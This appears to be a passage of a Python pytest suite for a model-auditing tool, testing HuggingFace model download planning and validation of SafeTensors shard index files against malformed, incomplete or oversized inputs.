            download_model("https://huggingface.co/test/model", max_size=1000)

        mock_snapshot_download.assert_not_called()

    @patch(
        "modelaudit.utils.sources.huggingface._list_repo_files_with_timeout",
        return_value=(["model.bin"], _HF_TEST_REVISION, None),
    )
    @patch("huggingface_hub.snapshot_download")
    @patch("shutil.rmtree")
    def test_download_model_cleanup_on_failure(
        self,
        mock_rmtree: MagicMock,
        mock_snapshot_download: MagicMock,
        _mock_list_repo_files: MagicMock,
    ) -> None:
        """Test that temporary directory is cleaned up on download failure."""
        # Make snapshot_download raise an exception
        mock_snapshot_download.side_effect = Exception("Download failed")

        # Test download failure
        with pytest.raises(Exception, match="Failed to download model"):
            download_model("https://huggingface.co/test/model")

        # Verify cleanup was attempted (only if temp dir was created)
        # Since we're mocking, we can't verify the exact behavior, but the code handles it

    def test_download_invalid_url(self):
        """Test that invalid URLs raise appropriate errors."""
        with pytest.raises(ValueError):
            download_model("https://github.com/user/repo")

    def test_missing_huggingface_hub_dependency(self):
        """Test error when huggingface-hub is not installed."""
        real_import = __import__
        with patch("builtins.__import__") as mock_import:

            def side_effect(name, *args, **kwargs):
                if name == "huggingface_hub":
                    raise ImportError("No module named 'huggingface_hub'")
                return real_import(name, *args, **kwargs)

            mock_import.side_effect = side_effect
            with pytest.raises(ImportError, match="huggingface-hub package is required"):
                download_model("https://huggingface.co/test/model")


class TestModelDownloadStreaming:
    @patch("modelaudit.utils.sources.huggingface._detect_huggingface_content_route_format", return_value=None)
    @patch("modelaudit.utils.sources.huggingface._get_model_extensions", return_value={".safetensors"})
    @patch(
        "modelaudit.utils.sources.huggingface._list_repo_files_with_timeout",
        return_value=(
            [
                "nested/adapter/model.safetensors.index.json",
                "nested/adapter/model-00000-of-00002.safetensors",
                "nested/adapter/model-00001-of-00002.safetensors",
            ],
            _HF_TEST_REVISION,
            None,
        ),
    )
    @patch("requests.get")
    @patch("huggingface_hub.hf_hub_download")
    def test_download_model_streaming_downloads_zero_based_safetensors_index_family(
        self,
        mock_hf_hub_download: MagicMock,
        mock_requests_get: MagicMock,
        _mock_list_repo_files: MagicMock,
        _mock_get_extensions: MagicMock,
        _mock_detect_content: MagicMock,
        tmp_path: Path,
    ) -> None:
        """Streaming selection should include nested zero-based shards and their index."""
        mock_requests_get.return_value = _FakeRangeResponse(
            json.dumps(
                {
                    "weight_map": {
                        "a": "model-00000-of-00002.safetensors",
                        "b": "model-00001-of-00002.safetensors",
                    }
                }
            ).encode()
        )

        def download_side_effect(*, filename: str, **_kwargs: object) -> str:
            path = tmp_path / "huggingface" / "test" / "model" / filename
            path.parent.mkdir(parents=True, exist_ok=True)
            path.write_bytes(b"downloaded")
            return str(path)

        mock_hf_hub_download.side_effect = download_side_effect

        results = list(download_model_streaming("https://huggingface.co/test/model", cache_dir=tmp_path))

        assert [path.relative_to(tmp_path / "huggingface" / "test" / "model").as_posix() for path, _ in results] == [
            "nested/adapter/model-00000-of-00002.safetensors",
            "nested/adapter/model-00001-of-00002.safetensors",
            "nested/adapter/model.safetensors.index.json",
        ]
        assert [is_last for _path, is_last in results] == [False, False, True]
        assert [call.kwargs["filename"] for call in mock_hf_hub_download.call_args_list] == [
            "nested/adapter/model.safetensors.index.json",
            "nested/adapter/model-00000-of-00002.safetensors",
            "nested/adapter/model-00001-of-00002.safetensors",
        ]

    @patch("modelaudit.utils.sources.huggingface._detect_huggingface_content_route_format", return_value=None)
    @patch("modelaudit.utils.sources.huggingface._get_model_extensions", return_value={".safetensors"})
    @patch(
        "modelaudit.utils.sources.huggingface._list_repo_files_with_timeout",
        return_value=(
            [
                "model.safetensors.index.json",
                "model-00000-of-00002.safetensors",
            ],
            _HF_TEST_REVISION,
            None,
        ),
    )
    @patch("requests.get")
    @patch("huggingface_hub.hf_hub_download")
    def test_download_model_streaming_rejects_incomplete_zero_based_safetensors_index_family(
        self,
        mock_hf_hub_download: MagicMock,
        mock_requests_get: MagicMock,
        _mock_list_repo_files: MagicMock,
        _mock_get_extensions: MagicMock,
        _mock_detect_content: MagicMock,
    ) -> None:
        """Streaming must not scan a partial indexed shard family."""
        mock_requests_get.return_value = _FakeRangeResponse(
            json.dumps(
                {
                    "weight_map": {
                        "a": "model-00000-of-00002.safetensors",
                        "b": "model-00001-of-00002.safetensors",
                    }
                }
            ).encode()
        )

        with pytest.raises(Exception, match="references missing model shard"):
            list(download_model_streaming("https://huggingface.co/test/model"))

        mock_hf_hub_download.assert_not_called()

    @patch("modelaudit.utils.sources.huggingface._detect_huggingface_content_route_format", return_value=None)
    @patch("modelaudit.utils.sources.huggingface._get_model_extensions", return_value={".safetensors"})
    @patch(
        "modelaudit.utils.sources.huggingface._list_repo_files_with_timeout",
        return_value=(
            [
                "model.safetensors.index.json",
                "shards/model-00001-of-00002.safetensors",
                "shards/model-00002-of-00002.safetensors",
            ],
            _HF_TEST_REVISION,
            None,
        ),
    )
    @patch("requests.get")
    @patch("huggingface_hub.hf_hub_download")
    def test_download_model_streaming_rejects_parent_index_missing_nested_target_with_substitute(
        self,
        mock_hf_hub_download: MagicMock,
        mock_requests_get: MagicMock,
        _mock_list_repo_files: MagicMock,
        _mock_get_extensions: MagicMock,
        _mock_detect_content: MagicMock,
    ) -> None:
        """Streaming must validate root indexes that govern nested selected shards."""
        mock_requests_get.return_value = _FakeRangeResponse(
            json.dumps(
                {
                    "weight_map": {
                        "a": "shards/model-00000-of-00002.safetensors",
                        "b": "shards/model-00001-of-00002.safetensors",
                    }
                }
            ).encode()
        )

        with pytest.raises(Exception, match="references missing model shard"):
            list(download_model_streaming("https://huggingface.co/test/model"))

        mock_hf_hub_download.assert_not_called()

    @pytest.mark.parametrize(
        "foreign_target",
        [
            "pytorch_model-00001-of-00001.bin",
            "checkpoint_1.pt",
            "model_weights_1.h5",
        ],
        ids=["pytorch-bin", "checkpoint-pt", "keras-h5"],
    )
    def test_download_model_streaming_rejects_foreign_safetensors_index_targets_before_download(
        self,
        foreign_target: str,
    ) -> None:
        """Streaming selection must not let a SafeTensors index pull foreign shard formats."""
        repo_files = [
            "model.safetensors.index.json",
            "model-00000-of-00001.safetensors",
            foreign_target,
        ]
        index_payload = json.dumps({"weight_map": {"tensor": foreign_target}}).encode()

        with (
            patch(
                "modelaudit.utils.sources.huggingface._list_repo_files_with_timeout",
                return_value=(repo_files, _HF_TEST_REVISION, None),
            ),
            patch("modelaudit.utils.sources.huggingface._detect_huggingface_content_route_format", return_value=None),
            patch("requests.get", return_value=_FakeRangeResponse(index_payload)),
            patch("huggingface_hub.hf_hub_download") as mock_hf_hub_download,
            pytest.raises(Exception, match="references a non-SafeTensors shard target"),
        ):
            list(
                download_model_streaming(
                    "https://huggingface.co/test/model",
                    scannable_extensions={".safetensors"},
                    scannable_scanner_ids={"safetensors"},
                )
            )

        mock_hf_hub_download.assert_not_called()

    @patch("modelaudit.utils.sources.huggingface._detect_huggingface_content_route_format", return_value=None)
    @patch(
        "modelaudit.utils.sources.huggingface._list_repo_files_with_timeout",
        return_value=(
            [
                "model.safetensors.index.json",
                "model-00000-of-00001.safetensors",
                "model-00001-of-00001.safetensors",
            ],
            _HF_TEST_REVISION,
            None,
        ),
    )
    @patch("requests.get")
    @patch("huggingface_hub.hf_hub_download")
    def test_download_model_streaming_rejects_unreferenced_safetensors_index_siblings(
        self,
        mock_hf_hub_download: MagicMock,
        mock_requests_get: MagicMock,
        _mock_list_repo_files: MagicMock,
        _mock_detect_content: MagicMock,
    ) -> None:
        """Streaming must fail closed on valid index inventories with extra same-family siblings."""
        mock_requests_get.return_value = _FakeRangeResponse(
            json.dumps({"weight_map": {"tensor": "model-00000-of-00001.safetensors"}}).encode()
        )

        with pytest.raises(Exception, match="leaves unreferenced model shard"):
            list(
                download_model_streaming(
                    "https://huggingface.co/test/model",
                    scannable_extensions={".safetensors"},
                    scannable_scanner_ids={"safetensors"},
                )
            )

        mock_hf_hub_download.assert_not_called()

    @pytest.mark.parametrize("scanner_ids", [None, {"xgboost"}], ids=["extensions-only", "scanner-ids"])
    def test_download_model_streaming_selected_json_does_not_expand_safetensors_index(
        self,
        tmp_path: Path,
        scanner_ids: set[str] | None,
    ) -> None:
        """A non-SafeTensors scanner selection may scan an index JSON without downloading its shards."""
        repo_files = [
            "model.safetensors.index.json",
            "model-00000-of-00001.safetensors",
            "model.ubj",
        ]
        sizes = {
            "model.safetensors.index.json": 40,
            "model-00000-of-00001.safetensors": 10_000,
            "model.ubj": 40,
        }

        def download_side_effect(*, filename: str, **_kwargs: object) -> str:
            path = tmp_path / filename
            path.write_bytes(b"x" * sizes[filename])
            return str(path)

        with (
            patch(
                "modelaudit.utils.sources.huggingface._list_repo_files_with_timeout",
                return_value=(repo_files, _HF_TEST_REVISION, None),
            ),
            patch(
                "modelaudit.utils.sources.huggingface._detect_huggingface_content_route_format",
                side_effect=lambda _repo, filename, _revision, _budget: (
                    "safetensors" if filename.endswith(".safetensors") else None
                ),
            ),
            patch(
                "modelaudit.utils.sources.huggingface._get_huggingface_path_sizes",
                return_value=(sizes, _HF_TEST_REVISION),
            ) as mock_get_sizes,
            patch("requests.get") as mock_requests_get,
            patch("huggingface_hub.hf_hub_download", side_effect=download_side_effect) as mock_hf_hub_download,
        ):
            results = list(
                download_model_streaming(
                    "https://huggingface.co/test/model",
                    scannable_extensions={".json", ".ubj"},
                    scannable_scanner_ids=scanner_ids,
                    max_size=100,
                )
            )

        assert [path.name for path, _is_last in results] == ["model.safetensors.index.json", "model.ubj"]
        assert [is_last for _path, is_last in results] == [False, True]
        assert mock_get_sizes.call_args.args[1] == ["model.safetensors.index.json", "model.ubj"]
        assert [call.kwargs["filename"] for call in mock_hf_hub_download.call_args_list] == [
            "model.safetensors.index.json",
            "model.ubj",
        ]
        mock_requests_get.assert_not_called()

    def test_model_plan_metadata_only_refuses_unproven_safetensors_candidates(self) -> None:
        """A metadata-only plan must fail closed before excluding a data file by suffix."""
        repo_files = [
            "model.safetensors.index.json",
            "model-00000-of-00001.safetensors",
            "model.ubj",
        ]
        with (
            patch(
                "modelaudit.utils.sources.huggingface._list_repo_files_with_timeout",
                return_value=(repo_files, _HF_TEST_REVISION, None),
            ),
            patch(
                "modelaudit.utils.sources.huggingface._get_huggingface_path_sizes",
                return_value=({"model.ubj": 40}, _HF_TEST_REVISION),
            ) as mock_get_sizes,
            patch("modelaudit.utils.sources.huggingface._detect_huggingface_content_route_format") as mock_detect,
            patch("requests.get") as mock_requests_get,
            pytest.raises(ValueError, match="metadata-only dry-run selection incomplete"),
        ):
            plan_huggingface_model_download(
                "https://huggingface.co/test/model",
                allow_content_probes=False,
                scannable_extensions={".ubj"},
                scannable_scanner_ids={"xgboost"},
            )

        mock_get_sizes.assert_not_called()
        mock_detect.assert_not_called()
        mock_requests_get.assert_not_called()

    def test_download_model_preserves_selected_extensionless_filename_routes(self, tmp_path: Path) -> None:
        """Standard downloads must retain exact filename routes from scanner selection."""
        repo_files = ["README", "model_card", "weights.safetensors"]
        download_path = tmp_path / "download"
        download_path.mkdir()
        for filename in ("README", "model_card"):
            (download_path / filename).write_text(filename, encoding="utf-8")

        with (
            patch(
                "modelaudit.utils.sources.huggingface._list_repo_files_with_timeout",
                return_value=(repo_files, _HF_TEST_REVISION, None),
            ),
            patch("modelaudit.utils.sources.huggingface._detect_huggingface_content_route_format") as mock_detect,
            patch("huggingface_hub.snapshot_download", return_value=str(download_path)) as mock_snapshot_download,
        ):
            result = download_model(
                "https://huggingface.co/test/model",
                cache_dir=tmp_path / "cache",
                scannable_extensions={".md", ".txt"},
                scannable_filenames={"readme", "model_card"},
                scannable_scanner_ids={"metadata"},
            )

        assert result == download_path
        assert mock_snapshot_download.call_args.kwargs["allow_patterns"] == ["README", "model_card"]
        mock_detect.assert_not_called()

    def test_model_plan_metadata_only_refuses_onnx_sidecar_ambiguity(self) -> None:
        """A standard dry-run cannot prove ONNX external_data companions without parsing the model."""
        with (
            patch(
                "modelaudit.utils.sources.huggingface._list_repo_files_with_timeout",
                return_value=(["model.onnx"], _HF_TEST_REVISION, None),
            ),
            patch("modelaudit.utils.sources.huggingface._get_huggingface_path_sizes") as mock_get_sizes,
            patch("modelaudit.utils.sources.huggingface._detect_huggingface_content_route_format") as mock_detect,
            pytest.raises(ValueError, match="content-routed to ONNX models"),
        ):
            plan_huggingface_model_download(
                "https://huggingface.co/test/model",
                allow_content_probes=False,
                scannable_extensions={".onnx"},
                scannable_scanner_ids={"onnx"},
            )

        mock_get_sizes.assert_not_called()
        mock_detect.assert_not_called()

    def test_model_plan_metadata_only_refuses_content_routed_onnx_sidecar_ambiguity(self) -> None:
        """A selected renamed ONNX candidate can still declare bookkeeping-named external data."""
        with (
            patch(
                "modelaudit.utils.sources.huggingface._list_repo_files_with_timeout",
                return_value=(["renamed.bin", ".gitattributes"], _HF_TEST_REVISION, None),
            ),
            patch("modelaudit.utils.sources.huggingface._get_huggingface_path_sizes") as mock_get_sizes,
            patch("modelaudit.utils.sources.huggingface._detect_huggingface_content_route_format") as mock_detect,
            pytest.raises(ValueError, match="content-routed to ONNX models"),
        ):
            plan_huggingface_model_download(
                "https://huggingface.co/test/model",
                allow_content_probes=False,
                scannable_extensions={".bin", ".onnx"},
                scannable_scanner_ids={"pickle", "onnx"},
            )

        mock_get_sizes.assert_not_called()
        mock_detect.assert_not_called()

    def test_remote_safetensors_index_inspection_count_is_bounded(self) -> None:
        """Remote inventory validation must fail before request limit plus one."""
        repo_files: list[str] = []
        selected_files: list[str] = []
        for index in range(_HF_SAFETENSORS_INDEX_MAX_FILES + 1):
            parent = f"family-{index}"
            index_file = f"{parent}/model.safetensors.index.json"
            shard_file = f"{parent}/model-00000-of-00001.safetensors"
            repo_files.extend([index_file, shard_file])
            selected_files.append(shard_file)
        budget = _HuggingFaceProbeBudget(remaining_bytes=64 * 1024 * 1024)

        with (
            patch("requests.get") as mock_requests_get,
            pytest.raises(ValueError, match="SafeTensors index inspection limit exceeded"),
        ):
            _validate_remote_safetensors_indexes(
                "test/model",
                repo_files,
                _HF_TEST_REVISION,
                selected_files,
                budget,
            )

        mock_requests_get.assert_not_called()

    def test_remote_safetensors_validation_ignores_unrelated_ancestor_index(self) -> None:
        """A root model index must not expand or reject a selected nested adapter family."""
        repo_files = [
            "model.safetensors.index.json",
            "model-00000-of-00001.safetensors",
            "adapter/model-00000-of-00001.safetensors",
        ]
        selected_files = [
            "model.safetensors.index.json",
            "adapter/model-00000-of-00001.safetensors",
        ]
        budget = _HuggingFaceProbeBudget(remaining_bytes=64 * 1024 * 1024)
        payload = json.dumps({"weight_map": {"root_tensor": "model-00000-of-00001.safetensors"}}).encode()

        with patch("requests.get", return_value=_FakeRangeResponse(payload)):
            result = _validate_remote_safetensors_indexes(
                "test/model",
                repo_files,
                _HF_TEST_REVISION,
                selected_files,
                budget,
            )

        assert result == selected_files

    def test_remote_safetensors_validation_does_not_probe_indexes_for_unsharded_selection(self) -> None:
        """Selecting one unsharded model must not make same-parent adapter indexes authoritative."""
        repo_files = [
            "model.safetensors",
            "adapter.safetensors.index.json",
            "adapter-00000-of-00001.safetensors",
        ]
        selected_files = ["model.safetensors"]
        budget = _HuggingFaceProbeBudget(remaining_bytes=64 * 1024 * 1024)
        payload = json.dumps({"weight_map": {"adapter": "adapter-00000-of-00001.safetensors"}}).encode()

        with patch("requests.get", return_value=_FakeRangeResponse(payload)) as mock_requests_get:
            result = _validate_remote_safetensors_indexes(
                "test/model",
                repo_files,
                _HF_TEST_REVISION,
                selected_files,
                budget,
            )

        assert result == selected_files
        mock_requests_get.assert_not_called()

    @pytest.mark.parametrize(
        "index_state",
        ["complete", "missing"],
        ids=["benign-complete", "benign-missing"],
    )
    def test_remote_safetensors_validation_ignores_unrelated_same_parent_family(
        self,
        index_state: str,
    ) -> None:
        """A disjoint adapter inventory must neither expand nor fail a selected model family."""
        selected_shard = "model-00001-of-00001.safetensors"
        adapter_targets = ["adapter-00000-of-00001.safetensors"]
        repo_files = ["adapter.safetensors.index.json", selected_shard, *adapter_targets]
        if index_state == "missing":
            adapter_targets = [
                "adapter-00000-of-00002.safetensors",
                "adapter-00001-of-00002.safetensors",
            ]
            repo_files = ["adapter.safetensors.index.json", selected_shard, adapter_targets[0]]
        selected_files = [selected_shard]
        budget = _HuggingFaceProbeBudget(remaining_bytes=64 * 1024 * 1024)
        payload = json.dumps(
            {"weight_map": {f"adapter-{index}": target for index, target in enumerate(adapter_targets)}}
        ).encode()

        with patch("requests.get", return_value=_FakeRangeResponse(payload)) as mock_requests_get:
            result = _validate_remote_safetensors_indexes(
                "test/model",
                repo_files,
                _HF_TEST_REVISION,
                selected_files,
                budget,
            )

        assert result == selected_files
        mock_requests_get.assert_called_once()

    @pytest.mark.parametrize(
        ("payload", "error_pattern"),
        [
            (b"{malformed", "is malformed"),
            (
                b'{"weight_map":{"missing":"adapter/model-00000-of-00002.safetensors"},'
                b'"weight_map":{"selected":"adapter/model-00000-of-00001.safetensors"}}',
                "contains duplicate JSON object keys",
            ),
        ],
        ids=["malformed", "duplicate-weight-map"],
    )
    def test_remote_safetensors_validation_rejects_ambiguous_ancestor_index(
        self,
        payload: bytes,
        error_pattern: str,
    ) -> None:
        """An invalid ancestor index cannot prove that it is unrelated to a nested family."""
        repo_files = [
            "model.safetensors.index.json",
            "adapter/model-00000-of-00001.safetensors",
        ]
        selected_files = [
            "model.safetensors.index.json",
            "adapter/model-00000-of-00001.safetensors",
        ]
        budget = _HuggingFaceProbeBudget(remaining_bytes=64 * 1024 * 1024)

        with (
            patch("requests.get", return_value=_FakeRangeResponse(payload)),
            pytest.raises(ValueError, match=error_pattern),
        ):
            _validate_remote_safetensors_indexes(
                "test/model",
                repo_files,
                _HF_TEST_REVISION,
                selected_files,
                budget,
            )

    def test_remote_safetensors_validation_rejects_malformed_same_directory_index(self) -> None:
        """A malformed index beside the selected family remains authoritative and fail-closed."""
        repo_files = [
            "adapter/model.safetensors.index.json",
            "adapter/model-00000-of-00001.safetensors",
        ]
        selected_files = ["adapter/model-00000-of-00001.safetensors"]
        budget = _HuggingFaceProbeBudget(remaining_bytes=64 * 1024 * 1024)

        with (
            patch("requests.get", return_value=_FakeRangeResponse(b"{malformed")),
            pytest.raises(ValueError, match="is malformed"),
        ):
            _validate_remote_safetensors_indexes(
                "test/model",
                repo_files,
                _HF_TEST_REVISION,
                selected_files,
                budget,
            )

    def test_remote_safetensors_validation_rejects_duplicate_json_keys(self) -> None:
        """Standard downloads reject parser-dependent duplicate index assignments."""
        repo_files = [
            "adapter/model.safetensors.index.json",
            "adapter/model-00000-of-00001.safetensors",
        ]
        selected_files = ["adapter/model-00000-of-00001.safetensors"]
        budget = _HuggingFaceProbeBudget(remaining_bytes=64 * 1024 * 1024)
        payload = (
            b'{"weight_map":{"tensor":"adapter/missing-00000-of-00001.safetensors",'
            b'"tensor":"model-00000-of-00001.safetensors"}}'
        )

        with (
            patch("requests.get", return_value=_FakeRangeResponse(payload)),
            pytest.raises(ValueError, match="contains duplicate JSON object keys"),
        ):
            _validate_remote_safetensors_indexes(
                "test/model",
                repo_files,
                _HF_TEST_REVISION,
                selected_files,
                budget,
            )

    def test_remote_safetensors_validation_enforces_tensor_occurrence_limit(
        self,
        monkeypatch: pytest.MonkeyPatch,
    ) -> None:
        """Standard download planning bounds tensor assignments independently of byte size."""
        from modelaudit.utils.sources import huggingface as huggingface_module

        shard = "adapter/model-00000-of-00001.safetensors"
        repo_files = ["adapter/model.safetensors.index.json", shard]
        budget = _HuggingFaceProbeBudget(remaining_bytes=64 * 1024 * 1024)
        payload = json.dumps({"weight_map": {"tensor-a": shard, "tensor-b": shard}}).encode()
        monkeypatch.setattr(huggingface_module, "_MAX_HF_SAFETENSORS_INDEX_TENSORS", 1)

        with (
            patch("requests.get", return_value=_FakeRangeResponse(payload)),
            pytest.raises(ValueError, match="exceeds tensor occurrence limit"),
        ):
            _validate_remote_safetensors_indexes(
                "test/model",
                repo_files,
                _HF_TEST_REVISION,
                [shard],
                budget,
            )

    def test_remote_safetensors_validation_enforces_json_structure_limit(
        self,
        monkeypatch: pytest.MonkeyPatch,
    ) -> None:
        """Standard download planning rejects container-heavy indexes before JSON decoding."""
        from modelaudit.utils.sources import huggingface as huggingface_module

        shard = "adapter/model-00000-of-00001.safetensors"
        repo_files = ["adapter/model.safetensors.index.json", shard]
        budget = _HuggingFaceProbeBudget(remaining_bytes=64 * 1024 * 1024)
        payload = json.dumps({"weight_map": {"tensor": shard}}).encode()
        monkeypatch.setattr(huggingface_module, "_MAX_HF_SAFETENSORS_INDEX_JSON_TOKENS", 1)

        with (
            patch("requests.get", return_value=_FakeRangeResponse(payload)),
            pytest.raises(ValueError, match="exceeds JSON object/value limit"),
        ):
            _validate_remote_safetensors_indexes(
                "test/model",
                repo_files,
                _HF_TEST_REVISION,
                [shard],
                budget,
            )

    def test_remote_safetensors_validation_rejects_split_directory_family(self) -> None:
        """Shard indices from different directories must not combine into one complete family."""
        repo_files = [
            "model.safetensors.index.json",
            "base/model-00000-of-00002.safetensors",
            "adapter/model-00001-of-00002.safetensors",
        ]
        budget = _HuggingFaceProbeBudget(remaining_bytes=64 * 1024 * 1024)
        payload = json.dumps(
            {
                "weight_map": {
                    "base": "base/model-00000-of-00002.safetensors",
                    "adapter": "adapter/model-00001-of-00002.safetensors",
                }
            }
        ).encode()

        with (
            patch("requests.get", return_value=_FakeRangeResponse(payload)),
            pytest.raises(ValueError, match="references multiple model shard families"),
        ):
            _validate_remote_safetensors_indexes(
                "test/model",
                repo_files,
                _HF_TEST_REVISION,
                repo_files,
                budget,
            )

    def test_remote_safetensors_validation_accepts_non_model_shard_stem(self) -> None:
        """Remote index authority must support valid arbitrary SafeTensors shard stems."""
        shard_files = [
            "diffusion_pytorch_model-00001-of-00002.safetensors",
            "diffusion_pytorch_model-00002-of-00002.safetensors",
        ]
        index_file = "diffusion_pytorch_model.safetensors.index.json"
        repo_files = [index_file, *shard_files]
        budget = _HuggingFaceProbeBudget(remaining_bytes=64 * 1024 * 1024)
        payload = json.dumps(
            {"weight_map": {f"tensor-{index}": shard for index, shard in enumerate(shard_files)}}
        ).encode()

        with patch("requests.get", return_value=_FakeRangeResponse(payload)):
            result = _validate_remote_safetensors_indexes(
                "test/model",
                repo_files,
                _HF_TEST_REVISION,
                shard_files,
                budget,
            )

        assert result == [*shard_files, index_file]

    def test_remote_safetensors_validation_rejects_missing_prefixed_index_target(self) -> None:
        """Prefixed SafeTensors indexes must not bypass missing-target validation."""
        index_file = "diffusion_pytorch_model.safetensors.index.json"
        first_shard = "diffusion_pytorch_model-00001-of-00002.safetensors"
        missing_shard = "diffusion_pytorch_model-00002-of-00002.safetensors"
        repo_files = [index_file, first_shard]
        budget = _HuggingFaceProbeBudget(remaining_bytes=64 * 1024 * 1024)
        payload = json.dumps({"weight_map": {"first": first_shard, "second": missing_shard}}).encode()

        with (
            patch("requests.get", return_value=_FakeRangeResponse(payload)),
            pytest.raises(ValueError, match="references missing model shard"),
        ):
            _validate_remote_safetensors_indexes(
                "test/model",
                repo_files,
                _HF_TEST_REVISION,
                [first_shard],
                budget,
            )

    def test_remote_safetensors_validation_rejects_missing_uppercase_custom_stem_target(self) -> None:
        """Case-insensitive shard routing must retain governing index validation."""
        index_file = "CUSTOM.SAFETENSORS.INDEX.JSON"
        first_shard = "CUSTOM-00001-of-00002.SAFETENSORS"
        missing_shard = "CUSTOM-00002-of-00002.SAFETENSORS"
        repo_files = [index_file, first_shard]
        budget = _HuggingFaceProbeBudget(remaining_bytes=64 * 1024 * 1024)
        payload = json.dumps({"weight_map": {"first": first_shard, "second": missing_shard}}).encode()

        with (
            patch("requests.get", return_value=_FakeRangeResponse(payload)),
            pytest.raises(ValueError, match="references missing model shard"),
        ):
            _validate_remote_safetensors_indexes(
                "test/model",
                repo_files,
                _HF_TEST_REVISION,
                [first_shard],
                budget,
            )

    def test_remote_safetensors_validation_metadata_only_refuses_index_reads(self) -> None:
        """Metadata-only planning must not range-read SafeTensors index content."""
        repo_files = [
            "model.safetensors.index.json",
            "model-00000-of-00001.safetensors",
        ]
        budget = _HuggingFaceProbeBudget(remaining_bytes=64 * 1024 * 1024)

        with (
            patch("requests.get") as mock_requests_get,
            pytest.raises(ValueError, match="metadata-only dry-run selection incomplete"),
        ):
            _validate_remote_safetensors_indexes(
                "test/model",
                repo_files,
                _HF_TEST_REVISION,
                repo_files,
                budget,
                allow_content_probes=False,
            )

        mock_requests_get.assert_not_called()

    def test_remote_safetensors_index_validation_checks_deadline_during_large_inventory(self) -> None:
        """Attacker-sized target loops must honor the shared acquisition deadline."""
        target_count = 256
        target_files = [
            f"part-{index}/model-{index:05d}-of-{target_count:05d}.safetensors" for index in range(target_count)
        ]
        payload = json.dumps(
            {"weight_map": {f"tensor-{index}": target for index, target in enumerate(target_files)}}
        ).encode()
        repo_files = ["model.safetensors.index.json", *target_files]
        budget = _HuggingFaceProbeBudget(remaining_bytes=64 * 1024 * 1024)

        with (
            patch.object(budget, "check_deadline", side_effect=[None, None, TimeoutError("deadline expired")]),
            patch("requests.get", return_value=_FakeRangeResponse(payload)),
            pytest.raises(TimeoutError, match="deadline expired"),
        ):
            _validate_remote_safetensors_indexes(
                "test/model",
                repo_files,
                _HF_TEST_REVISION,
                repo_files,
                budget,
            )

    """Test streaming model downloads from HuggingFace."""

    @patch("modelaudit.utils.sources.huggingface._get_huggingface_path_sizes")
    @patch(
        "modelaudit.utils.sources.huggingface._list_repo_files_with_timeout",
        return_value=(["model.safetensors"], _HF_TEST_REVISION, None),
    )
    def test_streaming_dry_run_plan_applies_header_native_max_size_policy(
        self,
        _mock_list_repo_files: MagicMock,
        mock_get_path_sizes: MagicMock,
    ) -> None:
        """Header-native dry-run planning must not count full tensor payload sizes."""
        plan = plan_huggingface_streaming_download(
            "hf://test/model",
            max_size=8,
            scannable_extensions={".safetensors"},
            scannable_scanner_ids={"safetensors"},
            allow_content_probes=False,
            _stream_safetensors_headers=True,
        )

        assert plan.selected_files == ["model.safetensors"]
        assert plan.selected_sizes == {}
        assert plan.download_revision == _HF_TEST_REVISION
        mock_get_path_sizes.assert_not_called()

    @patch("modelaudit.utils.sources.huggingface._get_huggingface_path_sizes")
    @patch(
        "modelaudit.utils.sources.huggingface._list_repo_files_with_timeout",
        return_value=(["model.safetensors"], _HF_TEST_REVISION, None),
    )
    def test_streaming_dry_run_plan_reserves_initial_safetensors_range(
        self,
        _mock_list_repo_files: MagicMock,
        mock_get_path_sizes: MagicMock,
    ) -> None:
        """Dry-run planning must reject budgets that cannot read the 8-byte frame."""
        with pytest.raises(ValueError, match="minimum remote SafeTensors routing reads"):
            plan_huggingface_streaming_download(
                "hf://test/model",
                max_size=7,
                scannable_extensions={".safetensors"},
                scannable_scanner_ids={"safetensors"},
                allow_content_probes=False,
                _stream_safetensors_headers=True,
            )

        mock_get_path_sizes.assert_not_called()

    @patch(
        "modelaudit.utils.sources.huggingface._get_huggingface_path_sizes",
        return_value=({"config.json": 4}, _HF_TEST_REVISION),
    )
    @patch(
        "modelaudit.utils.sources.huggingface._list_repo_files_with_timeout",
        return_value=(["config.json", "model.safetensors"], _HF_TEST_REVISION, None),
    )
    def test_streaming_dry_run_plan_combines_selected_files_with_header_minimum(
        self,
        _mock_list_repo_files: MagicMock,
        mock_get_path_sizes: MagicMock,
    ) -> None:
        """Ordinary selected bytes and minimum SafeTensors reads share one dry-run budget."""
        plan_kwargs: dict[str, Any] = {
            "scannable_extensions": {".json", ".safetensors"},
            "scannable_scanner_ids": {"metadata", "safetensors"},
            "allow_content_probes": False,
            "_stream_safetensors_headers": True,
        }

        with pytest.raises(ValueError, match="require at least 12 bytes"):
            plan_huggingface_streaming_download("hf://test/model", max_size=11, **plan_kwargs)

        plan = plan_huggingface_streaming_download("hf://test/model", max_size=12, **plan_kwargs)

        assert plan.selected_files == ["config.json", "model.safetensors"]
        assert plan.selected_sizes == {"config.json": 4}
        assert mock_get_path_sizes.call_count == 2

    def test_streaming_dry_run_plan_reserves_competing_route_content_probe(
        self,
        monkeypatch: pytest.MonkeyPatch,
    ) -> None:
        """Competing routes reserve the real initial probe plus the SafeTensors frame read."""
        filename = "model.safetensors"
        frame, _header_len = _make_safetensors_frame(
            {"tensor": {"dtype": "U8", "shape": [1], "data_offsets": [0, 1]}},
            b"\x00",
        )
        minimum_bytes = (2 * len(frame)) + 8
        monkeypatch.setattr(
            "modelaudit.utils.sources.huggingface._list_repo_files_with_timeout",
            lambda *_args, **_kwargs: ([filename], _HF_TEST_REVISION, None),
        )
        monkeypatch.setattr(
            "modelaudit.utils.sources.huggingface._get_huggingface_path_sizes",
            lambda *_args, **_kwargs: ({filename: len(frame)}, _HF_TEST_REVISION),
        )

        with patch("requests.get") as mock_requests_get:
            with pytest.raises(ValueError, match=f"require at least {minimum_bytes} bytes"):
                plan_huggingface_streaming_download(
                    "hf://test/model",
                    max_size=minimum_bytes - 1,
                    scannable_extensions={".safetensors"},
                    scannable_scanner_ids={"pickle", "safetensors"},
                    allow_content_probes=False,
                    _stream_safetensors_headers=True,
                )

            plan = plan_huggingface_streaming_download(
                "hf://test/model",
                max_size=minimum_bytes,
                scannable_extensions={".safetensors"},
                scannable_scanner_ids={"pickle", "safetensors"},
                allow_content_probes=False,
                _stream_safetensors_headers=True,
            )

        assert plan.selected_sizes == {filename: len(frame)}
        mock_requests_get.assert_not_called()

    def test_runtime_planning_keeps_large_declared_safetensors_header_native(
        self,
        monkeypatch: pytest.MonkeyPatch,
    ) -> None:
        """Metadata-only previews stay conservative without blocking bounded runtime scans."""
        filename = "model.safetensors"
        tensor_data = bytes(_HF_CONTENT_SNIFF_BYTES)
        frame, _header_len = _make_safetensors_frame(
            {
                "tensor": {
                    "dtype": "U8",
